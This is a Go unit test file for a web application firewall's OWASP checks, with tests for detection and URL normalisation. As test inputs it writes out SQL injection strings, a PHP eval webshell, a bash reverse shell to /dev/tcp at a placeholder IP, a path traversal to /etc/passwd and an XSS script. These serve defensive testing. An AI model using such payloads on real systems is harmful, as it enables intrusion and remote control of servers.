package waf

import (
	"testing"
)

func TestCheckOWASP_SQLi(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1' UNION SELECT * FROM users--", nil)
	if len(hits) == 0 {
		t.Fatal("expected SQLi hit")
	}
	if hits[0].Category != CatSQLi {
		t.Fatalf("expected sqli category, got %s", hits[0].Category)
	}
}

func TestCheckOWASP_SQLi_Low(t *testing.T) {
	// Low sensitivity requires higher score, simple comment alone shouldn't trigger
	hits := CheckOWASP("low", "/page", "q=hello--", nil)
	if len(hits) > 0 {
		t.Fatal("low sensitivity should not trigger on simple comment")
	}
}

func TestCheckOWASP_Webshell(t *testing.T) {
	hits := CheckOWASP("mid", "/upload.php", "<?php eval($_POST['cmd'])", nil)
	if len(hits) == 0 {
		t.Fatal("expected webshell hit")
	}
	found := false
	for _, h := range hits {
		if h.Category == CatWebshell {
			found = true
		}
	}
	if !found {
		t.Fatal("expected webshell category")
	}
}

func TestCheckOWASP_RevShell(t *testing.T) {
	hits := CheckOWASP("mid", "/", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", nil)
	if len(hits) == 0 {
		t.Fatal("expected reverse shell hit")
	}
	if hits[0].Category != CatRevShell {
		t.Fatalf("expected revshell, got %s", hits[0].Category)
	}
}

func TestCheckOWASP_PathTraversal(t *testing.T) {
	hits := CheckOWASP("mid", "/../../etc/passwd", "", nil)
	if len(hits) == 0 {
		t.Fatal("expected path traversal hit")
	}
}

func TestCheckOWASP_XSS(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=<script>alert(1)</script>", nil)
	if len(hits) == 0 {
		t.Fatal("expected XSS hit")
	}
}

func TestCheckOWASP_Clean(t *testing.T) {
	hits := CheckOWASP("mid", "/api/v1/users", "page=1&limit=10", nil)
	if len(hits) > 0 {
		t.Fatalf("expected no hits for clean request, got %d", len(hits))
	}
}

func TestNormalize(t *testing.T) {
	input := "%27%20OR%201%3D1%20--%20"
	result := normalize(input)
	if result != "' or 1=1 -- " {
		t.Fatalf("unexpected normalize result: %q", result)
	}
}
